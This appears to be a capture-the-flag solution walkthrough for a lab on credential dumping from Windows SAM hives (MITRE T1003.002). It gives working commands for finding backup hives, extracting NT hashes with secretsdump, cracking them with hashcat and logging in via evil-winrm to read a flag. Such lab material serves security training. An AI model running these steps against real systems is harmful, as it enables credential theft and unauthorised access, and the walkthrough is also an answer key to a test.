# Solution Walkthrough: T1003.002 (Security Account Manager)

### Step 1: Reconnaissance
As a low-privileged attacker on the system, search the C:\ drive for unusually named backup directories or `.hive` / `.bak` files. 
You can use PowerShell to find these files:
`Get-ChildItem -Path C:\ -Recurse -Include *.hive -ErrorAction SilentlyContinue`
You will discover a custom directory named `C:\Backup_Hives_Dir` containing `SAM_backup.hive` and `SYSTEM_backup.hive`.

### Step 2: Data Exfiltration
Since you only have read permissions, copy these two files to your local attacking machine (Kali Linux) using an SMB share, SCP, or by downloading them through your C2 channel.

### Step 3: Credential Extraction
The SAM hive contains the hashed passwords, but it is encrypted. The SYSTEM hive contains the boot key required to decrypt the SAM hive. Use Impacket's `secretsdump.py` on your attacking machine to extract the NT hashes:
`impacket-secretsdump -sam SAM_backup.hive -system SYSTEM_backup.hive LOCAL`

### Step 4: Analysis and Cracking
Review the output. You will see an account named `sec_admin_99` along with its NTLM hash (the string after the user ID and LM hash). 
Copy the NT hash and use Hashcat with the `rockyou.txt` wordlist (or a mutated list) to crack it:
`hashcat -m 1000 hashes.txt rockyou.txt`
This will reveal the plaintext password: `Winter2026@!!!`

### Step 5: Privilege Escalation and Flag Retrieval
Since `sec_admin_99` is part of the Administrators group, authenticate to the machine via WinRM (using Evil-WinRM) or RDP:
`evil-winrm -i <TARGET_IP> -u sec_admin_99 -p 'Winter2026@!!!'`
Once connected, navigate to the user's Desktop and read the flag:
`type C:\Users\sec_admin_99\Desktop\flag.txt`
